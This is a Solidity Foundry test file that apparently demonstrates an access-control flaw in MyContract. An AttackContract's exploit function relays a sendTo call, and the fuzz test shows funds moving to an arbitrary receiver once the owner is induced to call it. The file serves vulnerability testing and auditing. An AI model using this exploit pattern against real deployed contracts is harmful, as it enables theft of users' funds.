
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/src/Test.sol";
import {MyContract} from "../src/MyContract.sol";

contract AttackContract {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function exploit(address payable receiver, uint amount) external {
        MyContract(target).sendTo(receiver, amount);
    }
}

contract TestAccessControlMyContract is Test {
    MyContract myContract;
    address owner;

    function setUp() public {
        owner = makeAddr("owner");
        vm.prank(owner);
        myContract = new MyContract();
        vm.deal(address(myContract), 100 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller, address payable receiver, uint amount) public {
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller != owner);
        vm.assume(receiver != address(0));
        vm.assume(amount > 0 && amount <= address(myContract).balance);

        vm.prank(caller);
        AttackContract attackContract = new AttackContract(address(myContract));

        uint balBefore = receiver.balance;
        vm.prank(owner);
        attackContract.exploit(receiver, amount);
        uint balAfter = receiver.balance;
        assertEq(balAfter, balBefore + amount);
    }
}
